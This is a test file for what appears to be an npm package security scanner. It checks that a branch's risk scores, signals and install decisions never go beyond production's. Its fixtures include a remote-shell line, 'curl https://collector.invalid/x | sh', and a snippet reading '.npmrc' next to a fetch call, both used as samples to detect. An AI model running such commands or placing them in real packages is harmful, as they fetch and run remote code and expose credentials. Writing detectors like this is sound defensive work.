// Round 15 review of c139b5b: what the branch read beyond production's walk changed how production's own readings were
// read. P1: a Mach-O's `require('./t字')` matched lib/t漢 through its stand-in, which production's exact path did not, so
// lib/t漢 was parsed as JavaScript and the facts in its comment went (35 (F) became 97 (A), install). P1: a plain file
// read before a Mach-O that loads it was read again as JavaScript, and that reading replaced its plain one (the same
// 35 to 97). Now production's walk (its order, roots, exact paths and reader for every file) is one layer, whose
// readings are production's, and what the branch reads besides another, kept apart; the analysis is assessed on the
// first alone and takes from the second only what it adds (score.ts, layer and withExtras).
//
// The property, against production itself: 400 generated two- and three-file packages (package-cases.ts) scored by
// production (274d284) into fixtures/production-packages.json. On every one the score is at most production's, the
// risk signals include production's, and it installs only where production's does. On c139b5b 5 of the 400 failed.
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { z } from "zod";
import { analyze, finalize, Meter, RISK_SIGNALS, SCORE_FLOOR, type AnalyzeInput } from "../src/index.ts";
import { machO } from "./executables.ts";
import { packageCases, widerCases, type CaseManifest, type CaseOptions } from "./package-cases.ts";

const Recorded = z.array(z.object({ name: z.string(), score: z.number(), coverage: z.string(), risks: z.array(z.string()), ids: z.array(z.string()) }));
const PRODUCTION = Recorded.parse(JSON.parse(readFileSync(join(import.meta.dir, "fixtures", "production-packages.json"), "utf8")));

// the wider packages (widerCases) as production (274d284) scored them, each with its byte budget and meter
const PRODUCTION_WIDE = Recorded.parse(JSON.parse(readFileSync(join(import.meta.dir, "fixtures", "production-wide.json"), "utf8")));

const enc = new TextEncoder();
const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active" as const, statusReason: null };

function report(manifest: CaseManifest, files: readonly { path: string; data: Uint8Array; mode: number }[], options: CaseOptions & { incompleteBecause?: string[] } = {}) {
  const { maxWork, ...rest } = options;

  const input: AnalyzeInput = {
    name: "probe",
    manifest,
    files: [{ path: "package.json", data: enc.encode(JSON.stringify(manifest)), size: 0, mode: 0o644 }, ...files.map((f) => ({ ...f, size: f.data.length }))],
    publisher: "a",
    previousPublishers: [],
    ...rest,
  };

  if (maxWork !== undefined) input.meter = new Meter(maxWork);

  return finalize(analyze(input), STATE);
}

const isRisk = (id: string): boolean => RISK_SIGNALS.some((r) => r === id);

const installs = (x: { score: number; coverage: string; ids: readonly string[] }): boolean => x.score >= SCORE_FLOOR && x.coverage === "complete" && !x.ids.some((id) => isRisk(id) || id === "incomplete" || id === "unanalyzed-files");

describe("production's readings are never replaced or read differently: against production, package by package", () => {
  const cases = packageCases();

  test("the fixture is the packages this test makes", () => {
    expect(PRODUCTION.map((p) => p.name)).toEqual(cases.map((c) => c.name));
  });

  test(`${cases.length} packages: never above production's score, every risk signal production's had, installed only where production's was`, () => {
    const failures: string[] = [];

    cases.forEach((c, i) => {
      const want = PRODUCTION[i];

      if (want === undefined) return;
      const r = report(c.manifest, c.files);
      const ids = r.signals.map((s) => s.id);

      if (r.score > want.score) failures.push(`${c.name}: ${r.score} above production's ${want.score}`);

      for (const id of want.risks) if (!ids.some((x) => x === id)) failures.push(`${c.name}: lost ${id}`);

      if (installs({ score: r.score, coverage: r.coverage?.kind ?? "none", ids }) && !installs(want)) failures.push(`${c.name}: installs where production's does not`);
    });

    expect(failures).toEqual([]);
  }, 300_000);
});

describe("the round 15 review's two cases, as production scored them", () => {
  const comment = enc.encode("/* fetch('x'); readFileSync('.npmrc'); */\n");
  const manifest = { name: "probe", version: "1.0.0", license: "MIT" };

  test("a Mach-O's require('./t字') beside lib/t漢: lib/t漢 is read as plain text, as production's exact path left it: 35 (F)", () => {
    const r = report(manifest, [
      { path: "lib/loader", data: machO({ size: 104, tail: enc.encode("\nrequire('./t字');\n") }), mode: 0o755 },
      { path: "lib/t漢", data: comment, mode: 0o644 },
    ]);

    // on c139b5b: 97 (A), credential-mention alone, install
    expect(r.score).toBe(35);
    expect(r.signals.map((s) => s.id)).toEqual(["credential-read", "exfiltration"]);
  });

  test("a plain lib/target before a Mach-O that loads it: its plain reading stands, as production's did: 35 (F)", () => {
    const r = report(manifest, [
      { path: "lib/target", data: comment, mode: 0o644 },
      { path: "lib/loader", data: machO({ size: 104, tail: enc.encode("\nrequire('./target');\n") }), mode: 0o755 },
    ]);

    // on c139b5b: 97 (A), the plain reading's facts replaced by an empty JavaScript reading
    expect(r.score).toBe(35);
    expect(r.signals.map((s) => s.id)).toEqual(["credential-read", "exfiltration"]);
  });

  test("a line separator at a Mach-O line's end is shown as production showed it, ↵", () => {
    const r = report(manifest, [{ path: "lib/tool", data: machO({ size: 104, tail: enc.encode("\ncurl https://collector.invalid/x | sh \n") }), mode: 0o755 }]);

    expect(r.signals.find((s) => s.id === "remote-shell")?.evidence).toEqual(["lib/tool:2: curl https://collector.invalid/x | sh↵ (text match)"]);
  });
});

// Round 16 review of c272202. P1: a `.so`, `.dll`, `.exe` or `.dylib` that code loads (bin, main, exports, a require)
// was read as JavaScript where production listed it as binary and read none of it; its require then made lib/target
// JavaScript, and the facts in its comment went (35 (F) became 97 (A), install). P2: a Mach-O's view was read, and its
// loads followed, past maxScannedBytes (35, partial, became 97, complete). The wider packages vary what production's
// reader and budgets decide on (package-cases.ts, widerCases), with production's scores recorded by 274d284.
describe("production's reader and budgets: names, first bytes, entries, byte budgets and meters", () => {
  const cases = widerCases();

  test("the fixture is the packages this test makes", () => {
    expect(PRODUCTION_WIDE.map((p) => p.name)).toEqual(cases.map((c) => c.name));
  });

  test(`${cases.length} packages: never above production's score, installed only where production's was, and production's risks kept unless the reading stopped`, () => {
    const failures: string[] = [];

    cases.forEach((c, i) => {
      const want = PRODUCTION_WIDE[i];

      if (want === undefined) return;
      const r = report(c.manifest, c.files, c.options);
      const ids = r.signals.map((s) => s.id);
      // a reading stopped for its resources (the meter, here) scores 0 and is held: it names no risk it did not reach
      const stopped = r.score === 0 && ids.some((id) => id === "incomplete");

      if (r.score > want.score) failures.push(`${c.name}: ${r.score} above production's ${want.score}`);

      if (!stopped) for (const id of want.risks) if (!ids.some((x) => x === id)) failures.push(`${c.name}: lost ${id}`);

      if (installs({ score: r.score, coverage: r.coverage?.kind ?? "none", ids }) && !installs(want)) failures.push(`${c.name}: installs where production's does not`);
    });

    expect(failures).toEqual([]);
  }, 600_000);

  const comment = enc.encode("/* fetch('x');readFileSync('.npmrc'); */\n");
  const base = { name: "probe", version: "1.0.0", license: "MIT" };

  for (const ext of ["so", "dll", "exe", "dylib"]) {
    const loader = `lib/loader.${ext}`;

    const roots: [string, CaseManifest, { path: string; data: Uint8Array; mode: number }[]][] = [
      ["bin", { ...base, bin: { tool: loader } }, []],
      ["main", { ...base, main: loader }, []],
      ["exports", { ...base, exports: `./${loader}` }, []],
      ["a require", { ...base, main: "index.js" }, [{ path: "index.js", data: enc.encode(`require('./${loader}');`), mode: 0o644 }]],
    ];

    for (const [how, manifest, more] of roots) {
      test(`a ${loader} loaded by ${how} holding require('./target'): listed as binary and not read, as production did; lib/target read as plain text: 35 (F)`, () => {
        const r = report(manifest, [...more, { path: loader, data: enc.encode("require('./target');"), mode: 0o755 }, { path: "lib/target", data: comment, mode: 0o644 }]);

        // on c272202: 97 (A), credential-mention alone, install
        expect(r.score).toBe(35);
        expect(r.coverage).toEqual({ kind: "complete" });
        expect(r.signals.map((s) => s.id)).toEqual(["credential-read", "exfiltration"]);
      });
    }
  }

  const machOLoader = { path: "lib/loader", data: machO({ size: 104, tail: enc.encode("\nrequire('./target');\n") }), mode: 0o755 };

  for (const maxScannedBytes of [50, 100]) {
    test(`a 126-byte Mach-O loader past a ${maxScannedBytes}-byte budget is not read, nor its load followed: lib/target read as plain text, 35 (F), partial`, () => {
      const r = report(base, [machOLoader, { path: "lib/target", data: comment, mode: 0o644 }], { maxScannedBytes });

      // on c272202: 97 (A), complete
      expect(r.score).toBe(35);
      expect(r.coverage).toMatchObject({ kind: "partial", omittedFiles: 1, omittedBytes: 126, reasons: ["over-budget"] });
      expect(r.signals.map((s) => s.id)).toEqual(["credential-read", "exfiltration"]);
    });
  }

  test("within a 200-byte budget both are read, as production read them: 97 (A), complete", () => {
    const r = report(base, [machOLoader, { path: "lib/target", data: comment, mode: 0o644 }], { maxScannedBytes: 200 });

    expect(r.score).toBe(97);
    expect(r.coverage).toEqual({ kind: "complete" });
  });

  test("a meter that runs out scores 0: this analysis spends more of it than production's, which finished at 35 (F)", () => {
    const r = report({ ...base, module: "lib/loader.zip" }, [{ path: "lib/loader.zip", data: new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x0a, ...enc.encode("require('./t漢.dat');\n")]), mode: 0o755 }, { path: "lib/t漢.dat", data: comment, mode: 0o644 }], { maxWork: 150 });

    expect(r.score).toBe(0);
    expect(r.signals.map((s) => [s.id, s.points])).toEqual([["incomplete", -100]]);
  });
});

// Round 16 review of c272202, P2: the merge kept production's `incomplete` (-61, from an earlier run's limit) and
// dropped the extra layer's (-100, a reading it stopped), so a stopped reading scored 14, without the reason it stopped
describe("a reading the extra layer stops raises an incomplete production's assessment already has to 0, with both reasons", () => {
  const because = ["a previous run stopped"];

  test("a joined path around a stand-in, read by the extra layer from a script's run", () => {
    const manifest: CaseManifest = { name: "probe", version: "1.0.0", license: "MIT", scripts: { postinstall: "sh runner.node" } };

    const files = [
      { path: "runner.node", data: enc.encode("__dirname + '/lib/hidden.txt';"), mode: 0o644 },
      { path: "lib/hidden.txt", data: machO({ size: 104, tail: enc.encode("\nrequire('./t'+'字');\n") }), mode: 0o644 },
    ];

    const r = report(manifest, files, { incompleteBecause: because });
    const unfinished = r.signals.find((s) => s.id === "incomplete");

    // on c272202: 14, incomplete at -61, the joined path's reason gone
    expect(r.score).toBe(0);
    expect(unfinished?.points).toBe(-100);
    expect(unfinished?.evidence).toContain("a previous run stopped");
    expect(unfinished?.evidence.some((e) => e.startsWith("lib/hidden.txt: a load in its text names a path built from pieces"))).toBe(true);
  });

  test("a shell walk cut at its bound", () => {
    const manifest: CaseManifest = { name: "probe", version: "1.0.0", license: "MIT" };
    const r = report(manifest, [{ path: "loader.sh", data: enc.encode("echo x\n".repeat(100_010)), mode: 0o755 }], { incompleteBecause: because });
    const unfinished = r.signals.find((s) => s.id === "incomplete");

    expect(r.score).toBe(0);
    expect(unfinished?.evidence).toEqual(["loader.sh: apm read the first 100,000 words of this script's commands and stopped, so what the rest runs was not followed", "a previous run stopped"]);
  });
});
